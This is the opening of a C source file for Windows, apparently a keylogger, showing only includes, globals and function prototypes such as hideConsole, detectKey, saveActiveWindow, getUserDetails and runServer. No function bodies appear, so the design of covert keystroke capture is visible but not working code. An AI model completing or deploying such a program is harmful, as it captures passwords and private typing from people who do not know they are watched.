#include<stdio.h>
#include<time.h>
#include<windows.h>
#include<string.h>
#include<stdlib.h>
//#include<pthread.h>
FILE *log;
HWND stealth;
enum bool {true,false} kAdded=false;
short key=0;
struct
{
  struct tm ltime;
  char uname[20];
}tmStamp;

DWORD WINAPI runServer();
void AddChar(char);
void AddStamp();
void CheckPara(int,char*[]);
void Flush();
void CloseFile();
void CreateLog(char*);
int getSystemTime();
void display(char*);
void getUserDetails();
void hideConsole();
void detectKey();
void AddStr(char[]);
void saveActiveWindow();
